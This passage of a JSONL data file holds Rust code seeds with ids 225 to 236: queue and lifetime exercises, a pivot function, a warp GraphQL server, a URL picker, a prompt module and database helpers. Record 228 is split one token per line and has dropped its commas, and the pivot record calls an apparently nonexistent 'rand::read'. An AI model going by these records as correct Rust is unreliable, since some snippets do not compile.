 \/\/ 9.3\n    \/\/ struct Onesuch;\n    \/\/ let o = Onesuch;\n\n    \/\/ 9.4\n    \/\/ 9.5\n\n    \/\/\/ A first-in, first-out queue of characters.\n    pub struct Queue {\n        older: Vec<char>,   \/\/ older elements, eldest last.\n        younger: Vec<char>, \/\/ younger elements, youngest last.\n    }\n\n    impl Queue {\n        \/\/\/ Push a character onto the back of a queue.\n        pub fn push(&mut self, c: char) {\n            self.younger.push(c);\n        }\n\n        \/\/\/ Pop a character off the front of a queue. Return `Some(c)` if there\n        \/\/\/ was a character to pop, or `None` if the queue was empty.\n        pub fn pop(&mut self) -> Option<char> {\n            if self.older.is_empty() {\n                if self.younger.is_empty() {\n                    return None;\n                }\n\n                \/\/ Bring the elements in younger over to older, and put them in\n                \/\/ the promised order.\n                use std::mem::swap;\n                swap(&mut self.older, &mut self.younger);\n                self.older.reverse();\n            }\n\n            \/\/ Now older is guaranteed to have something,. Vec's pop method\n            \/\/ already returns an Option, so we're set.\n            self.older.pop()\n        }\n\n        pub fn is_empty(&self) -> bool {\n            self.older.is_empty() && self.younger.is_empty()\n        }\n\n        pub fn split(self) -> (Vec<char>, Vec<char>) {\n            (self.older, self.younger)\n        }\n\n        pub fn new() -> Queue {\n            Queue {\n                older: Vec::new(),\n                younger: Vec::new(),\n            }\n        }\n    }\n\n    let mut q = Queue::new();\n    \/\/ let mut q = Queue {\n    \/\/     older: Vec::new(),\n    \/\/     younger: Vec::new(),\n    \/\/ };\n\n    q.push('0');\n    q.push('1');\n    assert_eq!(q.pop(), Some('0'));\n\n    q.push('\u221e');\n    assert_eq!(q.pop(), Some('1'));\n    assert_eq!(q.pop(), Some('\u221e'));\n    assert_eq!(q.pop(), None);\n\n    assert!(q.is_empty());\n    q.push('\u29bf');\n    assert!(!q.is_empty());\n    q.pop();\n\n    q.push('P');\n    q.push('D');\n    assert_eq!(q.pop(), Some('P'));\n    q.push('X');\n\n    let (older, younger) = q.split();\n    \/\/ q is now uninitialized.\n    assert_eq!(older, vec!['D']);\n    assert_eq!(younger, vec!['X']);\n\n    \/\/ 9.6\n\n    pub struct QueueT<T> {\n        older: Vec<T>,\n        younger: Vec<T>,\n    }\n\n    impl<T> QueueT<T> {\n        pub fn new() -> Self {\n            QueueT {\n                older: Vec::new(),\n                younger: Vec::new(),\n            }\n        }\n\n        pub fn push(&mut self, t: T) {\n            self.younger.push(t);\n        }\n\n        pub fn is_empty(&self) -> bool {\n            self.older.is_empty() && self.younger.is_empty()\n        }\n    }\n\n    \/\/ let mut qt = QueueT::<char>::new();\n\n    let mut qt = QueueT::new();\n    let mut rt = QueueT::new();\n\n    qt.push(\"CAD\"); \/\/ apparently a Queue<&'static str>\n    rt.push(0.74); \/\/ apparently a Queue<f64>\n\n    qt.push(\"BTC\"); \/\/ Bitcoins per USD, 2017-5\n    rt.push(2737.7); \/\/ Rust fails to detect ittational exuberance\n\n    \/\/ 9.7\n\n    struct Extrema<'elt> {\n        greatest: &'elt i32,\n        least: &'elt i32,\n    }\n\n    fn find_extrema<'s>(slice: &'s [i32]) -> Extrema<'s> {\n        let mut greatest = &slice[0];\n        let mut least = &slice[0];\n\n        for i in 1..slice.len() {\n            if slice[i] < *least {\n                least = &slice[i];\n            }\n            if slice[i] > *greatest {\n                greatest = &slice[i];\n            }\n        }\n        Extrema { greatest, least }\n    }\n\n    let a = [0, -3, 0, 15, 48];\n    let e = find_extrema(&a);\n    assert_eq!(*e.least, -3);\n    assert_eq!(*e.greatest, 48);\n\n    \/\/ 9.8\n    \/\/ #[derive(Copy, Clone, Debug, PartialEq)]\n    \/\/ struct Point {\n    \/\/     x: f64,\n    \/\/     y: f64,\n    \/\/ }\n\n    \/\/ 9.9\n\n    \/\/ pub struct SpiderRobot {\n    \/\/     species: String,\n    \/\/     web_enabled: bool,\n    \/\/     log_device: [fd::FileDesc; 8],\n    \/\/     ...\n    \/\/ }\n\n    \/\/ use std::rc::Rc;\n    \/\/ pub struct SpiderSenses {\n    \/\/     robot: Rc<SpiderRobot>, \/\/\/ <-- pointer to settings and I\/O\n    \/\/     eyes: [Camera; 32],\n    \/\/     motion: Accelerometer,\n    \/\/     ...\n    \/\/ }\n\n    use std::cell::Cell;\n    use std::cell::RefCell;\n    use std::fs::File;\n\n    pub struct SpiderRobot {\n        hardware_error_count: Cell<u32>,\n        log_file: RefCell<File>,\n    }\n\n    impl SpiderRobot {\n        \/\/\/ Increase the error count by 1.\n        pub fn add_hardware_error(&self) {\n            let n = self.hardware_error_count.get();\n            self.hardware_error_count.set(n + 1);\n        }\n\n        \/\/\/ True if any hardware errors have been reported.\n        pub fn has_hardware_errors(&self) -> bool {\n            self.hardware_error_count.get() > 0\n        }\n\n        \/\/\/ Write a line to the log file.\n        pub fn log(&self, message: &str) {\n            let mut file = self.log_file.borrow_mut();\n            \/\/ writeln!(file, \"{}\", message).unwrap();\n        }\n    }\n\n    let ref_cell: RefCell<String> = RefCell::new(\"hello\".to_string());\n\n    let r = ref_cell.borrow(); \/\/ ok, return a Ref<String>\n    let count = r.len(); \/\/ ok, returns \"hello\".len()\n    assert_eq!(count, 5);\n\n    \/\/ let mut w = ref_cell.borrow_mut(); \/\/ panic: already borrowed\n    \/\/ w.push_str(\" world\");\n}","id":225}
{"seed":"pub fn pivot<T: PartialOrd>(v: &mut [T]) -> usize {\n    let mut p = rand::read(v.len());\n    v.swap(p, 0);\n    p = 0;\n    for i in 1..v.len() {\n        if v[i] < v[p] {\n            \/\/ move our pivot forward 1, and put this element before it\n            v.swap(p+1, i);\n            v.swap(p, p+1);\n            p += 1\n        }\n    }\n    p\n}","id":226}
{"seed":"fn de_timeline(raw: TimelineRaw, even: bool) -> game::Timeline {\n    let mut res = game::Timeline::new(\n        de_l(raw.index, even),\n        raw.width,\n        raw.height,\n        raw.begins_at,\n        raw.emerges_from.map(|x| de_l(x, even)),\n    );\n\n    let index = de_l(raw.index, even);\n    let begins_at = raw.begins_at;\n    let width = raw.width;\n    let height = raw.height;\n\n    res.states = raw\n        .states\n        .into_iter()\n        .enumerate()\n        .map(|(i, b)| de_board(b, begins_at + i as isize, index, width, height))\n        .collect();\n\n    res\n}","id":227}
{"seed":"fn\ntest_empty_blob\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\nlet\nempty\n=\nvec\n!\n[\n]\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nb\n)\nVALUES\n(\n?\n1\n)\n\"\n[\n&\nempty\n]\n)\n?\n;\nlet\nv\n:\nVec\n<\nu8\n>\n=\ndb\n.\none_column\n(\n\"\nSELECT\nb\nFROM\nfoo\n\"\n)\n?\n;\nassert_eq\n!\n(\nv\nempty\n)\n;\nOk\n(\n(\n)\n)\n}","id":228}
{"seed":"fn check_layout(layout: Layout) -> Result<(), AllocErr> {\n    if layout.size() > LARGEST_POWER_OF_TWO {\n        return Err(AllocErr::Unsupported { details: \"Bigger than largest power of two\" });\n    }\n    debug_assert!(layout.size() > 0);\n    Ok(())\n}","id":229}
{"seed":"async fn main() {\n    env::set_var(\"RUST_LOG\", \"warp_server\");\n    env_logger::init();\n\n    let log = warp::log(\"warp_server\");\n\n    let homepage = warp::path::end().map(|| {\n        Response::builder()\n            .header(\"content-type\", \"text\/html\")\n            .body(\n                \"<html><h1>juniper_warp<\/h1><div>visit <a href=\\\"\/playground\\\">\/playground<\/a><\/html>\"\n                    .to_string(),\n            )\n    });\n\n    log::info!(\"Listening on 127.0.0.1:8080\");\n\n    let state = warp::any().map(move || Context {});\n    let graphql_filter = juniper_warp::make_graphql_filter(schema(), state.boxed());\n\n    warp::serve(\n        warp::get()\n            .and(warp::path(\"playground\"))\n            .and(juniper_warp::playground_filter(\"\/graphql\", None))\n            .or(homepage)\n            .or(warp::path(\"graphql\").and(graphql_filter))\n            .with(log),\n    )\n    .run(([127, 0, 0, 1], 8080))\n    .await\n}","id":230}
{"seed":"pub fn main() {\n    Opt::from_args();\n\n    let options = SkimOptionsBuilder::default()\n        .multi(true)\n        .bind(vec![\"ctrl-k:kill-line\"])\n        .build()\n        .unwrap();\n\n    let re = Regex::new(URL_REGEX).unwrap();\n    let mut buffer = String::new();\n    io::stdin().read_to_string(&mut buffer).unwrap();\n    let lines = buffer.split(\"\\n\");\n\n    let mut split_lines = false;\n    let mut split_line_buffer: Vec<&str> = Vec::new();\n    let mut merged_lines: Vec<String> = Vec::new();\n    for line in lines {\n        if line.len() == 0 {\n            continue\n        }\n\n        if line.ends_with(LINE_SPLITTER) {\n            let mergable = line.get(0..line.len() - 1).unwrap_or(\"\");\n            split_line_buffer.push(mergable);\n            split_lines = true;\n            continue;\n        }\n\n        if split_lines {\n            split_lines = false;\n            split_line_buffer.push(line);\n            let merged_line = &split_line_buffer.join(\"\");\n            merged_lines.push(merged_line.to_string());\n            split_line_buffer = Vec::new();\n        } else {\n            merged_lines.push(line.to_string());\n        }\n    }\n\n    let mut matches: HashMap<String, u8> = HashMap::new();\n    let mut match_index = 1;\n    for line in merged_lines {\n        let sanitized = line.replace(\"=3D\", \"=\");\n\n        for capture in re.captures_iter(&sanitized) {\n            let url_match = capture.get(1).unwrap().as_str();\n            if matches.contains_key(url_match) {\n                continue;\n            }\n            matches.insert(url_match.to_string(), match_index);\n            match_index += 1;\n        }\n    }\n\n    let mut ordered_items: Vec<_> = matches.into_iter().collect();\n    ordered_items.sort_by(|a, b| a.1.cmp(&b.1));\n\n    let item_list: Vec<_> = ordered_items.iter().map(|item| item.0.as_str()).collect();\n    let items = item_list.join(\"\\n\");\n\n    let item_reader = SkimItemReader::default();\n    let items = item_reader.of_bufread(Cursor::new(items));\n\n    let output = Skim::run_with(&options, Some(items)).unwrap();\n    if output.is_abort {\n        return;\n    }\n\n    for item in output.selected_items.iter() {\n        let url = item.clone();\n        Command::new(\"firefox\")\n            .arg(url.output().as_ref())\n            .stdout(Stdio::null())\n            .stderr(Stdio::null())\n            .spawn()\n            .unwrap();\n    }\n}","id":231}
{"seed":"pub fn test_jump0() {\n    let buffer = fs::read(\"tests\/programs\/jump0_64\").unwrap().into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"jump0_64\".into()]);\n    assert!(result.is_err());\n    assert_eq!(result.err(), Some(Error::MemWriteOnExecutablePage));\n}","id":232}
{"seed":"pub fn module<'a>(context: &'a Context) -> Option<Module<'a>> {\n    const SUCCESS_CHAR: &str = \"\u279c\";\n    const FAILURE_CHAR: &str = \"\u2716\";\n    let color_success = Color::Green.bold();\n    let color_failure = Color::Red.bold();\n\n    let mut module = context.new_module(\"character\")?;\n    module.get_prefix().set_value(\"\");\n\n    let arguments = &context.arguments;\n    let use_symbol = module\n        .config_value_bool(\"use_symbol_for_status\")\n        .unwrap_or(false);\n    let exit_success = arguments.value_of(\"status_code\").unwrap_or(\"0\") == \"0\";\n\n    \/* If an error symbol is set in the config, use symbols to indicate\n    success\/failure, in addition to color *\/\n    let symbol = if use_symbol && !exit_success {\n        module.new_segment(\"error_symbol\", FAILURE_CHAR)\n    } else {\n        module.new_segment(\"symbol\", SUCCESS_CHAR)\n    };\n\n    if exit_success {\n        symbol.set_style(color_success.bold());\n    } else {\n        symbol.set_style(color_failure.bold());\n    };\n\n    Some(module)\n}","id":233}
{"seed":"fn most_least_common(btm: BTreeMap<char, i32>) -> (char, char) {\n    let mut count_vec: Vec<_> = btm.into_iter().collect();\n    \/\/ Reverse sort the vector of pairs by \"value\" (sorted by \"key\" in case of tie)\n    count_vec.sort_by(|a, b| b.1.cmp(&a.1));\n    let m = count_vec.first().map(|&(k, _)| k).unwrap();\n    let l = count_vec.last().map(|&(k, _)| k).unwrap();\n    (m, l)\n}","id":234}
{"seed":"async fn init() -> Nash {\n    dotenv().ok();\n\n    let parameters = NashParameters {\n        credentials: Some(NashCredentials {\n            secret: env::var(\"NASH_API_SECRET\").unwrap(),\n            session: env::var(\"NASH_API_KEY\").unwrap(),\n        }),\n        environment: Environment::Sandbox,\n        client_id: 1,\n        timeout: 1000,\n    };\n\n    OpenLimits::instantiate(parameters).await\n}","id":235}
{"seed":"fn read_or_create_default_database() -> Result<DataBase> {\n    let default_database_paths = get_default_database_paths();\n\n    if default_database_paths.is_empty() {\n        eprintln!(\"{}\", format!(\n            \"Could not find a location for the default database. \\\n            Opening a database which cannot be saved.\",\n        ).color(\"yellow\"));\n\n        return Ok(DataBase::new());\n    }\n\n    \/\/ See if a default database can be found at any path before creating a new one.\n    for path in &default_database_paths {\n        if path.is_file() {\n            return read_database(&path).map_err(|err| GrafenCliError::from(err))\n        }\n    }\n\n    let mut default_database = DataBase::new();\n    let default_path = &default_database_paths[0];\n\n    if let Some(parent_dir) = default_path.parent() {\n        match DirBuilder::new().recursive(true).create(&parent_dir) {\n            Ok(_) => default_database.set_path(&default_path).unwrap(),\n            Err(err) => {\n                eprintln!(\"{}\", format!(\n                    \"Warning: Could not create a folder for a default database at '{}' ({}). \\\n                    Opening a database which cannot be saved.\",\n                    default_path.display(), err\n                ).color(\"yellow\"));\n            },\n        }\n    }\n\n    Ok(default_database)\n}","id":236}
